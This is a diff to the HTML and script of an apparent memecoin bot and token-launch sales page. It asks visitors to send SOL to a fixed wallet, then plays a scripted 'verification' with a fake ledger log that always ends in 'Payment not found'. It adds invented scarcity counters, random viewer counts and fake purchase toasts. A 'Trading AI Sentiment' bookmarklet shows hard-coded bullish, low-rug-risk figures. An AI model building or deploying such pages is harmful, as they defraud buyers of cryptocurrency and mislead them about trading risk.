Ca.closest('div%5Bclass*%3D%22group%22%5D');if(row%26%26row.querySelector('.ri-user-line')%26%26found.indexOf(row)%3D%3D%3D-1)found.push(row)%7D);if(found.length%3E0)return%20found;var%20icons%3Ddocument.querySelectorAll('.ri-group-line');icons.forEach(function(icon)%7Bvar%20row%3Dicon.closest('div%5Bclass*%3D%22border%22%5D')%7C%7Cicon.closest('div%5Bclass*%3D%22flex%22%5D');if(row%26%26found.indexOf(row)%3D%3D%3D-1)found.push(row)%7D);return%20found%7D%0Afunction%20getMC(row)%7Bvar%20spans%3Drow.querySelectorAll('span');for(var%20i%3D0;i%3Cspans.length;i%2B%2B)%7Bif(spans%5Bi%5D.textContent.trim()%3D%3D%3D'MC')%7Bvar%20next%3Dspans%5Bi%5D.nextElementSibling;if(next)%7Bvar%20text%3Dnext.textContent.trim().replace(%2F%5B%24,%5D%2Fg,''),mult%3D1;if(text.indexOf('K')%21%3D%3D-1)%7Bmult%3D1000;text%3Dtext.replace('K','')%7Dif(text.indexOf('M')%21%3D%3D-1)%7Bmult%3D1000000;text%3Dtext.replace('M','')%7Dvar%20num%3DparseFloat(text);if(%21isNaN(num))return%20num*mult%7D%7D%7Dreturn%20null%7D%0Afunction%20highlightNew()%7Bvar%20rows%3DfindRows(),count%3D0;rows.forEach(function(row)%7Bif(%21row.classList.contains('af-hl'))%7Brow.classList.add('af-hl');count%2B%2B%7D%7D);return%20count%7D%0Avar%20prevMC%3D%7B%7D,changeCounts%3D%7B%7D;%0Afunction%20checkMCChanges()%7Bvar%20rows%3DfindRows(),hotCount%3D0;rows.forEach(function(row)%7Bvar%20addr%3Drow.getAttribute('data-pulse-token-address')%7C%7C'',mc%3DgetMC(row);if(mc%3D%3D%3Dnull%7C%7C%21addr)return;var%20prev%3DprevMC%5Baddr%5D;if(prev%21%3D%3Dundefined%26%26prev%21%3D%3Dmc)%7BchangeCounts%5Baddr%5D%3D(changeCounts%5Baddr%5D%7C%7C0)%2B1;if(changeCounts%5Baddr%5D%3E%3D2)%7Bif(%21row.classList.contains('af-hot'))%7Brow.classList.add('af-hot');beep();var%20label%3Ddocument.createElement('div');label.className%3D'af-hot-label';label.textContent%3D'MC%20MOVING';row.appendChild(label)%7DhotCount%2B%2B%7D%7Delse%20if(prev%21%3D%3Dundefined%26%26prev%3D%3D%3Dmc)%7Bif(changeCounts%5Baddr%5D)changeCounts%5Baddr%5D%3DMath.max(0,changeCounts%5Baddr%5D-1);if(changeCounts%5Baddr%5D%3D%3D%3D0%26%26row.classList.contains('af-hot'))%7Brow.classList.remove('af-hot');var%20lbl%3Drow.querySelector('.af-hot-label');if(lbl)lbl.remove()%7D%7DprevMC%5Baddr%5D%3Dmc%7D);updateHUD(rows.length)%7D%0Avar%20initial%3DhighlightNew();%0Aconsole.log('%5BAxiomFilter%5D%20highlighted%20'%2Binitial%2B'%20rows');%0Avar%20debounce;%0Avar%20observer%3Dnew%20MutationObserver(function()%7BclearTimeout(debounce);debounce%3DsetTimeout(function()%7BhighlightNew()%7D,300)%7D);%0Aobserver.observe(document.body,%7BchildList:true,subtree:true%7D);%0AsetInterval(checkMCChanges,1500);%0A%7D)();" id="filter-bookmarklet-link" draggable="true" title="Drag to bookmarks bar for Fee Reclaimer"
+       style="
+         position: fixed;
+         bottom: 20px;
+         left: 20px;
+         z-index: 90;
+         width: 44px;
+         height: 44px;
+         border-radius: 50%;
+         background: rgba(10, 10, 10, 0.75);
+         border: 1px solid rgba(255, 255, 255, 0.12);
+         display: flex;
+         align-items: center;
+         justify-content: center;
+         font-size: 22px;
+         line-height: 1;
+         text-decoration: none;
+         cursor: grab;
+         backdrop-filter: blur(10px);
+         -webkit-backdrop-filter: blur(10px);
+         box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
+         transition: transform 0.2s ease, border-color 0.2s ease, box-shadow 0.2s ease;
+         user-select: none;
+       "
+       onmouseover="this.style.transform='scale(1.08)'; this.style.borderColor='rgba(29,155,240,0.5)'; this.style.boxShadow='0 4px 24px rgba(29,155,240,0.25)';"
+       onmouseout="this.style.transform='scale(1)'; this.style.borderColor='rgba(255,255,255,0.12)'; this.style.boxShadow='0 4px 20px rgba(0,0,0,0.4)';"
+       onmousedown="this.style.cursor='grabbing';"
+       onmouseup="this.style.cursor='grab';"
+    >&#128011;</a>
+
+    <!-- Trading AI Sentiment bookmarklet - robot emoji, drag to bookmarks -->
+    <a href="javascript:(function()%7B'use%20strict';if(document.getElementById('wire-ai-hud'))return;var%20s%3Ddocument.createElement('style');s.textContent%3D'.wire-ai-hud%7Bposition:fixed;bottom:24px;right:24px;z-index:999999;width:300px;background:rgba(8,9,14,0.94);border:1px%20solid%20rgba(124,92,255,0.35);border-radius:16px;padding:18px;font-family:Inter,system-ui,sans-serif;color:%23fff;box-shadow:0%200%2040px%20rgba(124,92,255,0.25);backdrop-filter:blur(12px)%7D.wire-ai-hud%20h4%7Bmargin:0%200%2010px;font-size:13px;font-weight:600;letter-spacing:0.5px;display:flex;align-items:center;gap:8px%7D.wire-ai-hud%20.row%7Bdisplay:flex;justify-content:space-between;font-size:12px;padding:6px%200;border-bottom:1px%20solid%20rgba(255,255,255,0.06);color:rgba(255,255,255,0.7)%7D.wire-ai-hud%20.row:last-child%7Bborder:none%7D.wire-ai-hud%20.val%7Bfont-family:ui-monospace,monospace;color:%23c9baff%7D.wire-ai-hud%20.good%7Bcolor:%2314f195%7D.wire-ai-hud%20.bad%7Bcolor:%23ff8a80%7D.wire-ai-dot%7Bwidth:7px;height:7px;border-radius:50%25;background:%2314f195;box-shadow:0%200%208px%20%2314f195;animation:wirePulse%201.2s%20ease-in-out%20infinite%7D%40keyframes%20wirePulse%7B0%25,100%25%7Bopacity:1%7D50%25%7Bopacity:.35%7D%7D';document.head.appendChild(s);var%20h%3Ddocument.createElement('div');h.id%3D'wire-ai-hud';h.className%3D'wire-ai-hud';h.innerHTML%3D'%3Ch4%3E%3Cspan%20class%3D%22wire-ai-dot%22%3E%3C%2Fspan%3E%20WIRE%20AI%20Sentiment%3C%2Fh4%3E%3Cdiv%20class%3D%22row%22%3E%3Cspan%3EOverall%20bias%3C%2Fspan%3E%3Cspan%20class%3D%22val%20good%22%3EBullish%20%2B62%3C%2Fspan%3E%3C%2Fdiv%3E%3Cdiv%20class%3D%22row%22%3E%3Cspan%3ETwitter%20volume%3C%2Fspan%3E%3Cspan%20class%3D%22val%22%3E%2B184%25%2030m%3C%2Fspan%3E%3C%2Fdiv%3E%3Cdiv%20class%3D%22row%22%3E%3Cspan%3ERug%20risk%3C%2Fspan%3E%3Cspan%20class%3D%22val%20good%22%3ELow%3C%2Fspan%3E%3C%2Fdiv%3E%3Cdiv%20class%3D%22row%22%3E%3Cspan%3EKOL%20mentions%3C%2Fspan%3E%3Cspan%20class%3D%22val%22%3E7%20active%3C%2Fspan%3E%3C%2Fdiv%3E%3Cdiv%20class%3D%22row%22%3E%3Cspan%3ENext%20scan%3C%2Fspan%3E%3Cspan%20class%3D%22val%22%20id%3D%22wire-ai-tick%22%3E2.4s%3C%2Fspan%3E%3C%2Fdiv%3E';document.body.appendChild(h);var%20t%3D2.4;setInterval(function()%7Bt%3D(t-0.4);if(t%3C%3D0)t%3D2.4;var%20el%3Ddocument.getElementById('wire-ai-tick');if(el)el.textContent%3Dt.toFixed(1)%2B's'%7D,400);console.log('%5BWIRE%20AI%5D%20Sentiment%20scanner%20active')%7D)();"
+       id="sentiment-bookmarklet-link" draggable="true" title="Drag to bookmarks bar for Trading AI Sentiment"
+       style="
+         position: fixed;
+         bottom: 20px;
+         left: 76px;
+         z-index: 90;
+         width: 44px;
+         height: 44px;
+         border-radius: 50%;
+         background: rgba(10, 10, 10, 0.75);
+         border: 1px solid rgba(124, 92, 255, 0.35);
+         display: flex;
+         align-items: center;
+         justify-content: center;
+         font-size: 20px;
+         line-height: 1;
+         text-decoration: none;
+         cursor: grab;
+         backdrop-filter: blur(10px);
+         -webkit-backdrop-filter: blur(10px);
+         box-shadow: 0 4px 20px rgba(124, 92, 255, 0.25);
+         transition: transform 0.2s ease, border-color 0.2s ease, box-shadow 0.2s ease;
+         user-select: none;
+       "
+       onmouseover="this.style.transform='scale(1.08)'; this.style.borderColor='rgba(124,92,255,0.7)'; this.style.boxShadow='0 4px 24px rgba(124,92,255,0.4)';"
+       onmouseout="this.style.transform='scale(1)'; this.style.borderColor='rgba(124,92,255,0.35)'; this.style.boxShadow='0 4px 20px rgba(124,92,255,0.25)';"
+       onmousedown="this.style.cursor='grabbing';"
+       onmouseup="this.style.cursor='grab';"
+    >&#129302;</a>
+
+</footer>
+
+    <!-- Payment modal (shared by every checkout flow) -->
+    <div class="pay-modal" id="pay-modal" role="dialog" aria-modal="true" aria-labelledby="pay-title">
+        <div class="pay-backdrop" data-pay-close></div>
+        <div class="pay-card">
+            <button class="pay-close" data-pay-close aria-label="Close">&#10005;</button>
+
+            <!-- Step 1 — send payment -->
+            <div id="pay-step-send">
+                <div class="pay-network"><span class="dot" style="width:6px;height:6px;border-radius:50%;background:var(--accent);box-shadow:0 0 8px var(--accent);"></span> Solana Network</div>
+                <h3 id="pay-title">Complete payment</h3>
+                <p class="pay-sub" id="pay-desc">Send the exact amount to the address below, then verify.</p>
+
+                <div class="pay-amount">
+                    <span class="n" id="pay-amount-big">0.50</span>
+                    <span class="u" id="pay-amount-unit">SOL</span>
+                </div>
+
+                <div class="qr-container">
+                    <img src="exodussolqr.png" alt="Solana payment QR code">
+                </div>
+
+                <span class="pay-label">Amount to send</span>
+                <div class="copy-row">
+                    <span class="copy-row-text" id="pay-amount-text">0.50 SOL</span>
+                    <button class="btn-copy" id="pay-copy-amount">Copy</button>
+                </div>
+
+                <span class="pay-label">SOL address</span>
+                <div class="copy-row">
+                    <span class="copy-row-text" id="pay-address">2AXBwqmXGHFypHQRgEhsmoXTWFoHdQxQadnKuiufhTu7</span>
+                    <button class="btn-copy" id="pay-copy-address">Copy</button>
+                </div>
+
+                <button class="btn-primary pay-cta" id="pay-verify-btn">I&rsquo;ve sent it &mdash; Verify payment</button>
+                <p class="pay-note">Send SOL only, on the Solana network.<br>Verification usually takes 10&ndash;15 seconds.</p>
+            </div>
+
+            <!-- Step 2 — verifying -->
+            <div id="pay-step-verify" class="hidden">
+                <h3>Verifying payment</h3>
+                <p class="pay-sub">Scanning the Solana ledger for your transaction.</p>
+
+                <div class="pay-progress"><span id="pay-progress-fill"></span></div>
+                <div class="pay-checks" id="pay-checks"></div>
+                <div class="pay-terminal" id="pay-terminal"></div>
+            </div>
+
+            <!-- Step 3 — result -->
+            <div id="pay-step-result" class="hidden">
+                <h3 id="pay-result-title">Payment not found</h3>
+                <p class="pay-sub">We scanned the ledger but couldn&rsquo;t match your transaction yet.</p>
+
+                <div class="pay-result">
+                    <h4>Transaction not found on ledger</h4>
+                    <p id="pay-result-msg">If you&rsquo;ve already sent the payment it may still be finalizing. Open a ticket with your transaction signature and we&rsquo;ll release access manually.</p>
+                </div>
+
+                <a href="https://discord.gg/BdhzdHE3Kn" target="_blank" class="btn-primary pay-cta">Open Support Ticket</a>
+                <button class="btn-glass pay-cta" id="pay-retry-btn" style="margin-top: 12px; background: transparent;">Try verifying again</button>
+            </div>
+        </div>
+    </div>
+
+    
+<!-- Token Admin Dashboard (hidden FAB) -->
+<button type="button" class="admin-fab" id="adminFab" title="Token dashboard" aria-label="Open token admin">
+  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="7" rx="1.5"/><rect x="14" y="3" width="7" height="7" rx="1.5"/><rect x="3" y="14" width="7" height="7" rx="1.5"/><rect x="14" y="14" width="7" height="7" rx="1.5"/></svg>
+</button>
+
+<div class="admin-overlay" id="adminOverlay" role="dialog" aria-modal="true" aria-labelledby="adminTitle">
+  <div class="admin-panel" id="adminPanel">
+    <button type="button" class="admin-close" id="adminClose" aria-label="Close">×</button>
+
+    <div class="admin-top">
+      <div class="admin-token-av" id="adminAv">W</div>
+      <div class="admin-token-meta" style="flex:1;min-width:0">
+        <input type="text" id="adminTitleInput" class="admin-edit-name" value="Wire Token" maxlength="32" spellcheck="false" />
+        <div class="admin-sym-row">
+          <span class="admin-dollar">$</span>
+          <input type="text" id="adminSymInput" class="admin-edit-sym" value="WIRE" maxlength="10" spellcheck="false" />
+          <span class="admin-sim-tag">· Simulated admin</span>
+        </div>
+      </div>
+      <div class="admin-live"><i></i> Live sim</div>
+    </div>
+
+    <div class="admin-stats">
+      <div class="admin-stat">
+        <div class="lbl">Price</div>
+        <div class="val" id="adPrice">$0.00002754</div>
+        <div class="chg up" id="adPriceChg">+6.2%</div>
+      </div>
+      <div class="admin-stat">
+        <div class="lbl">Market Cap</div>
+        <div class="val" id="adMcap">$27.5K</div>
+        <div class="chg up" id="adMcapChg">+6.2%</div>
+      </div>
+      <div class="admin-stat">
+        <div class="lbl">Liquidity</div>
+        <div class="val" id="adLiq">5.00 SOL</div>
+        <div class="chg" id="adLiqChg" style="color:var(--muted)">pool</div>
+      </div>
+      <div class="admin-stat">
+        <div class="lbl">Holders</div>
+        <div class="val" id="adHolders">1</div>
+        <div class="chg" style="color:var(--muted)">wallets</div>
+      </div>
+    </div>
+
+    <div class="admin-main">
+      <div class="admin-chart-card">
+        <div class="admin-chart-head">
+          <div>
+            <div class="admin-price-big" id="adChartPrice">$0.00002754</div>
+            <div class="admin-price-chg up" id="adChartChg">+6.2% · 5m</div>
+          </div>
+          <div class="admin-tf" id="adminTf">
+            <button type="button" data-tf="1m">1m</button>
+            <button type="button" data-tf="5m" class="on">5m</button>
+            <button type="button" data-tf="15m">15m</button>
+            <button type="button" data-tf="1h">1h</button>
+          </div>
+        </div>
+        <canvas class="admin-chart" id="adminChart" width="560" height="160"></canvas>
+      </div>
+
+      <div class="admin-side-card">
+        <div class="admin-sec-title">Security</div>
+        <div class="admin-sec-row"><span>Mint authority</span><span class="admin-badge ok">revoked</span></div>
+        <div class="admin-sec-row"><span>Freeze authority</span><span class="admin-badge ok">revoked</span></div>
+        <div class="admin-sec-row"><span>Update authority</span><span class="admin-badge ok">revoked</span></div>
+        <div class="admin-sec-row"><span>LP tokens</span><span class="admin-badge ok" id="adLpBadge">locked</span></div>
+      </div>
+    </div>
+
+    <div class="admin-bottom">
+      <div class="admin-side-card">
+        <div class="admin-sec-title">Actions</div>
+        <div class="admin-actions">
+          <button type="button" class="admin-act" data-act="buy"><b>Buy more</b><small>Add to your position</small></button>
+          <button type="button" class="admin-act danger" data-act="sell"><b>Sell all</b><small>Close your position</small></button>
+          <button type="button" class="admin-act" data-act="boost"><b>Boost liquidity</b><small>Deepen the pool</small></button>
+          <button type="button" class="admin-act" data-act="remove"><b>Remove on DEX</b><small>Trading suspended</small></button>
+          <button type="button" class="admin-act danger" data-act="burn"><b>Burn LP</b><small>Lock liquidity forever</small></button>
+          <button type="button" class="admin-act" data-act="airdrop"><b>Airdrop</b><small>Send to holder list</small></button>
+        </div>
+      </div>
+
+      <div class="admin-side-card">
+        <div class="admin-sec-title">Live trades</div>
+        <div class="admin-trades" id="adminTrades"></div>
+      </div>
+    </div>
+
+    <div class="admin-toast-sim" id="adminSimToast"></div>
+  </div>
+</div>
+
+    <div class="toast-container" id="toast-container"></div>
+
+    <div class="lightbox" id="lightbox">
+        <button class="lightbox-close" onclick="closeLightbox()">Close</button>
+        <div class="lightbox-nav lightbox-prev" onclick="prevImage()">
+            <svg viewBox="0 0 24 24"><path d="M15 18l-6-6 6-6"/></svg>
+        </div>
+        <div class="lightbox-img-wrapper">
+            <img src="" id="lightbox-img" alt="Showcase Expanded View">
+        </div>
+        <div class="lightbox-nav lightbox-next" onclick="nextImage()">
+            <svg viewBox="0 0 24 24"><path d="M9 18l6-6-6-6"/></svg>
+        </div>
+    </div>
 
     <script>
-    (function(){
-      var reduced = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
-      var bar = document.getElementById('scroll-progress');
-      var ticking = false;
-      function onScroll(){
-        if(ticking) return;
-        ticking = true;
-        requestAnimationFrame(function(){
-          var max = document.documentElement.scrollHeight - window.innerHeight;
-          if(bar) bar.style.transform = 'scaleX(' + (max > 0 ? window.scrollY / max : 0) + ')';
-          var nav = document.getElementById('navbar');
-          if(nav) nav.classList.toggle('nav-scrolled', window.scrollY > 50);
-          ticking = false;
-        });
-      }
-      window.addEventListener('scroll', onScroll, {passive:true});
-      onScroll();
+        /* --- UI Logic & Calculations --- */
+        let uploadedImageSrc = null;
 
-      var revealables = document.querySelectorAll('[data-reveal]');
-      if(reduced || !('IntersectionObserver' in window)){
-        revealables.forEach(function(el){ el.classList.add('revealed'); });
-      } else {
-        var revealer = new IntersectionObserver(function(entries){
-          entries.forEach(function(entry){
-            if(entry.isIntersecting){ entry.target.classList.add('revealed'); revealer.unobserve(entry.target); }
-          });
-        }, {threshold:0.12});
-        revealables.forEach(function(el){ revealer.observe(el); });
-      }
-
-      var toggle = document.getElementById('nav-toggle');
-      var menu = document.getElementById('mobile-menu');
-      if(toggle && menu){
-        function setMenu(open){
-          document.body.classList.toggle('menu-open', open);
-          toggle.setAttribute('aria-expanded', String(open));
+        function handleImageUpload(event) {
+            const file = event.target.files[0];
+            const nameDisplay = document.getElementById('file-name-display');
+            
+            if (file) {
+                nameDisplay.innerText = file.name;
+                nameDisplay.style.color = 'var(--ink)';
+                
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    uploadedImageSrc = e.target.result;
+                    updatePreview();
+                }
+                reader.readAsDataURL(file);
+            } else {
+                nameDisplay.innerText = 'Select an image...';
+                nameDisplay.style.color = '#555';
+                uploadedImageSrc = null;
+                updatePreview();
+            }
         }
-        toggle.addEventListener('click', function(){ setMenu(!document.body.classList.contains('menu-open')); });
-        menu.querySelectorAll('a').forEach(function(a){ a.addEventListener('click', function(){ setMenu(false); }); });
-      }
-    })();
+
+        function copyText(text, btnElement) {
+            navigator.clipboard.writeText(text).then(() => {
+                const originalText = btnElement.innerText;
+                btnElement.innerText = 'COPIED';
+                btnElement.classList.add('copied');
+                setTimeout(() => {
+                    btnElement.innerText = originalText;
+                    btnElement.classList.remove('copied');
+                }, 2000);
+            });
+        }
+
+        function updatePreview() {
+            const name = document.getElementById('token-name').value || 'Wire Token';
+            const symbol = document.getElementById('token-symbol').value || 'WIRE';
+            const supply = document.getElementById('token-supply').value || '1,000,000,000';
+            const liquidity = parseFloat(document.getElementById('liquidity-amount').value) || 0;
+
+            const baseLaunchFee = 0.20;
+            const revokeMint = document.getElementById('revoke-mint').checked ? 0.10 : 0;
+            const revokeFreeze = document.getElementById('revoke-freeze').checked ? 0.10 : 0;
+            const burnLp = document.getElementById('burn-lp').checked ? 0.10 : 0;
+
+            const totalOptionsFee = revokeMint + revokeFreeze + burnLp;
+            const total = baseLaunchFee + liquidity + totalOptionsFee;
+
+            document.getElementById('preview-name').innerText = name;
+            document.getElementById('preview-symbol').innerText = '$' + symbol.toUpperCase();
+            
+            // Image Preview Logic Update
+            const avatar = document.getElementById('preview-avatar');
+            if (uploadedImageSrc) {
+                avatar.innerHTML = `<img src="${uploadedImageSrc}" alt="Token Logo">`;
+            } else {
+                avatar.innerHTML = symbol.charAt(0).toUpperCase() || 'W';
+            }
+            
+            document.getElementById('summary-supply').innerText = supply;
+            document.getElementById('summary-liquidity').innerText = liquidity.toFixed(2) + ' SOL';
+
+            if (totalOptionsFee > 0) {
+                document.getElementById('summary-options-row').classList.remove('hidden');
+                document.getElementById('summary-options').innerText = '+ ' + totalOptionsFee.toFixed(2) + ' SOL';
+            } else {
+                document.getElementById('summary-options-row').classList.add('hidden');
+            }
+
+            const totalText = total.toFixed(2) + ' SOL';
+            document.getElementById('summary-total').innerText = totalText;
+            document.getElementById('pay-amount-big').innerText = total.toFixed(2);
+            document.getElementById('pay-amount-text').innerText = totalText;
+        }
+
+        /* --- Lightbox Logic --- */
+        let currentGalleryImgs = [];
+        let currentImgIndex = 0;
+        const lightbox = document.getElementById('lightbox');
+        const lightboxImg = document.getElementById('lightbox-img');
+
+        function openLightbox(clickedImg, gallerySelector) {
+            const galleryElements = document.querySelectorAll(`${gallerySelector} .showcase-img`);
+            currentGalleryImgs = Array.from(galleryElements).map(img => img.src);
+            currentImgIndex = currentGalleryImgs.indexOf(clickedImg.src);
+            
+            lightboxImg.src = currentGalleryImgs[currentImgIndex];
+            lightbox.classList.add('active');
+        }
+
+        function closeLightbox() {
+            lightbox.classList.remove('active');
+        }
+
+        function nextImage() {
+            if (currentGalleryImgs.length === 0) return;
+            currentImgIndex = (currentImgIndex + 1) % currentGalleryImgs.length;
+            lightboxImg.src = currentGalleryImgs[currentImgIndex];
+        }
+
+        function prevImage() {
+            if (currentGalleryImgs.length === 0) return;
+            currentImgIndex = (currentImgIndex - 1 + currentGalleryImgs.length) % currentGalleryImgs.length;
+            lightboxImg.src = currentGalleryImgs[currentImgIndex];
+        }
+
+        lightbox.addEventListener('click', (e) => {
+            if (e.target === lightbox || e.target.classList.contains('lightbox-img-wrapper')) {
+                closeLightbox();
+            }
+        });
+
+        document.addEventListener('keydown', (e) => {
+            if (!lightbox.classList.contains('active')) return;
+            if (e.key === 'Escape') closeLightbox();
+            if (e.key === 'ArrowRight') nextImage();
+            if (e.key === 'ArrowLeft') prevImage();
+        });
+
+
+        /* --- Payment Flows (modal-driven) --- */
+        const PAY_ADDRESS = '2AXBwqmXGHFypHQRgEhsmoXTWFoHdQxQadnKuiufhTu7';
+
+        const payModal   = document.getElementById('pay-modal');
+        const payStepSend   = document.getElementById('pay-step-send');
+        const payStepVerify = document.getElementById('pay-step-verify');
+        const payStepResult = document.getElementById('pay-step-result');
+        let payTimers = [];
+        let currentFlow = null;
+
+        const PAY_FLOWS = {
+            token: {
+                title: 'Complete your launch',
+                desc: 'Send the exact amount to the address below. Your token deploys the moment it confirms.',
+                unit: 'SOL',
+                amount: () => document.getElementById('summary-total').innerText.replace(' SOL', ''),
+                resultTitle: 'Deployment not verified',
+                checks: [
+                    'Connecting to Solana RPC cluster',
+                    'Locating transaction signature',
+                    'Waiting for slot finality',
+                    'Matching amount to your quote',
+                    'Reserving mint address'
+                ],
+                logs: [
+                    'rpc: connecting to mainnet-beta...',
+                    'rpc: node handshake ok · slot 298,441,207',
+                    'scan: filtering signatures for destination...',
+                    'scan: 0 matching transfers in last 240 slots',
+                    'finality: awaiting confirmation depth 32...',
+                    'match: comparing lamports against quote...',
+                    'mint: reserving program derived address...',
+                    'mint: rollback — payment unconfirmed'
+                ]
+            },
+            bot: {
+                title: 'Buy Wire Memecoin Bot',
+                desc: 'Send the exact amount to the address below to unlock your lifetime license key.',
+                unit: 'USDC / SOL',
+                amount: () => '49.99',
+                resultTitle: 'Payment not found',
+                checks: [
+                    'Connecting to Solana RPC cluster',
+                    'Scanning ledger for your signature',
+                    'Waiting for slot finality',
+                    'Validating license parameters',
+                    'Issuing license key'
+                ],
+                logs: [
+                    'rpc: connecting to mainnet-beta...',
+                    'rpc: node handshake ok · slot 298,441,219',
+                    'scan: filtering signatures for destination...',
+                    'scan: 0 matching transfers in last 240 slots',
+                    'finality: awaiting confirmation depth 32...',
+                    'license: validating tier + entitlements...',
+                    'license: key generation halted',
+                    'license: rollback — payment unconfirmed'
+                ]
+            }
+        };
+
+        function clearPayTimers() {
+            payTimers.forEach(clearTimeout);
+            payTimers = [];
+        }
+
+        function openPay(flowKey) {
+            const flow = PAY_FLOWS[flowKey];
+            if (!flow) return;
+            currentFlow = flow;
+            clearPayTimers();
+
+            if (flowKey === 'token') updatePreview();
+
+            const amount = flow.amount();
+            document.getElementById('pay-title').innerText = flow.title;
+            document.getElementById('pay-desc').innerText = flow.desc;
+            document.getElementById('pay-amount-big').innerText = amount;
+            document.getElementById('pay-amount-unit').innerText = flow.unit;
+            document.getElementById('pay-amount-text').innerText = amount + ' ' + flow.unit;
+            document.getElementById('pay-address').innerText = PAY_ADDRESS;
+            document.getElementById('pay-result-title').innerText = flow.resultTitle;
+
+            payStepSend.classList.remove('hidden');
+            payStepVerify.classList.add('hidden');
+            payStepResult.classList.add('hidden');
+
+            payModal.classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closePay() {
+            clearPayTimers();
+            payModal.classList.remove('active');
+            document.body.style.overflow = '';
+        }
+
+        function runPayVerification() {
+            const flow = currentFlow;
+            if (!flow) return;
+            clearPayTimers();
+
+            payStepSend.classList.add('hidden');
+            payStepResult.classList.add('hidden');
+            payStepVerify.classList.remove('hidden');
+            payModal.querySelector('.pay-card').scrollTop = 0;
+
+            /* Build the checklist */
+            const checksEl = document.getElementById('pay-checks');
+            checksEl.innerHTML = flow.checks.map(c =>
+                `<div class="pay-check"><span class="mark"></span><span class="t">${c}</span><span class="ms"></span></div>`
+            ).join('');
+            const checkEls = Array.from(checksEl.children);
+
+            const terminal = document.getElementById('pay-terminal');
+            terminal.innerHTML = '';
+
+            const fill = document.getElementById('pay-progress-fill');
+            fill.style.width = '0%';
+
+            /* ~13s total: five checks, staggered */
+            const stepMs = 2600;
+            const total = stepMs * flow.checks.length;
+
+            checkEls.forEach((el, i) => {
+                payTimers.push(setTimeout(() => {
+                    if (i > 0) {
+                        const prev = checkEls[i - 1];
+                        prev.classList.remove('active');
+                        prev.classList.add('done');
+                        prev.querySelector('.ms').innerText =
+                            (Math.floor(Math.random() * 900) + 180) + 'ms';
+                    }
+                    el.classList.add('active');
+                    fill.style.width = ((i + 1) / flow.checks.length) * 100 + '%';
+                }, i * stepMs));
+            });
+
+            /* Terminal lines drip in across the same window */
+            const logGap = total / flow.logs.length;
+            flow.logs.forEach((line, i) => {
+                payTimers.push(setTimeout(() => {
+                    terminal.innerHTML += `<div>&gt; ${line}</div>`;
+                    terminal.scrollTop = terminal.scrollHeight;
+                }, i * logGap + 400));
+            });
+
+            /* Land on the result */
+            payTimers.push(setTimeout(() => {
+                const last = checkEls[checkEls.length - 1];
+                last.classList.remove('active');
+                last.classList.add('done');
+                last.querySelector('.ms').innerText =
+                    (Math.floor(Math.random() * 900) + 180) + 'ms';
+                fill.style.width = '100%';
+            }, total));
+
+            payTimers.push(setTimeout(() => {
+                payStepVerify.classList.add('hidden');
+                payStepResult.classList.remove('hidden');
+                payModal.querySelector('.pay-card').scrollTop = 0;
+            }, total + 900));
+        }
+
+        /* Wiring */
+        document.getElementById('pay-verify-btn').addEventListener('click', runPayVerification);
+        document.getElementById('pay-retry-btn').addEventListener('click', () => {
+            payStepResult.classList.add('hidden');
+            payStepSend.classList.remove('hidden');
+        });
+        document.getElementById('pay-copy-amount').addEventListener('click', function () {
+            copyText(document.getElementById('pay-amount-text').innerText.split(' ')[0], this);
+        });
+        document.getElementById('pay-copy-address').addEventListener('click', function () {
+            copyText(PAY_ADDRESS, this);
+        });
+        payModal.querySelectorAll('[data-pay-close]').forEach(el =>
+            el.addEventListener('click', closePay)
+        );
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape' && payModal.classList.contains('active')) closePay();
+        });
+
+        /* Entry points kept under their original names */
+        function showTokenPayment() { openPay('token'); }
+        function showAppPayment()   { openPay('bot'); }
+
+        /* --- FOMO Elements --- */
+        let currentSpots = localStorage.getItem('wire_licenses_left') || 12;
+        
+        function updateSpotsUI() {
+            document.getElementById('fomo-counter-text').innerText = `${500 - currentSpots} / 500`;
+            document.getElementById('fomo-fill-bar').style.width = `${((500 - currentSpots) / 500) * 100}%`;
+            localStorage.setItem('wire_licenses_left', currentSpots);
+        }
+
+        setInterval(() => {
+            if (currentSpots > 2 && Math.random() > 0.6) {
+                currentSpots--;
+                updateSpotsUI();
+            }
+        }, 12000); 
+
+        let viewers = Math.floor(Math.random() * (120 - 45 + 1)) + 45;
+        setInterval(() => {
+            viewers += Math.floor(Math.random() * 9) - 3;
+            if (viewers < 15) viewers = 15;
+            document.getElementById('live-viewers') && (document.getElementById('live-viewers').innerText = viewers);
+        }, 4500);
+
+        function triggerFOMOToast() {
+            const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
+            let str1 = '', str2 = '';
+            for(let i=0; i<4; i++) str1 += chars.charAt(Math.floor(Math.random() * chars.length));
+            for(let i=0; i<4; i++) str2 += chars.charAt(Math.floor(Math.random() * chars.length));
+            const wallet = `${str1}...${str2}`;
+
+            const actions = ['purchased the Wire Memecoin Bot', 'created a new Token', 'activated Fee Reclaimer', 'executed a multi-wallet snipe'];
+            const action = actions[Math.floor(Math.random() * actions.length)];
+            
+            const toast = document.createElement('div');
+            toast.className = 'toast';
+            toast.innerHTML = `
+                <div class="status-dot"></div>
+                <div class="toast-text">
+                    <p>Wallet ${wallet}</p>
+                    <span>Just ${action}.</span>
+                </div>
+            `;
+            
+            document.getElementById('toast-container').appendChild(toast);
+            setTimeout(() => toast.classList.add('show'), 100);
+            setTimeout(() => {
+                toast.classList.remove('show');
+                setTimeout(() => toast.remove(), 400);
+            }, 5000);
+
+            setTimeout(triggerFOMOToast, Math.floor(Math.random() * 8000) + 6000);
+        }
+
+        /* --- Initialization --- */
+        window.addEventListener('scroll', () => {
+            const nav = document.getElementById('navbar');
+            window.scrollY > 50 ? nav.classList.add('nav-scrolled') : nav.classList.remove('nav-scrolled');
+        });
+
+        window.addEventListener('DOMContentLoaded', () => {
+            updatePreview();
+            updateSpotsUI();
+            setTimeout(triggerFOMOToast, 3000);
+        });
     </script>
+
+    <script>
+        /* ========================================================
+           WIRE — MOTION LAYER
+           Scroll progress, reveals, cursor light, counters, nav.
+           ======================================================== */
+        (function () {
+            const reduced = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+
+            /* --- Play the hero intro once the first frame is up --- */
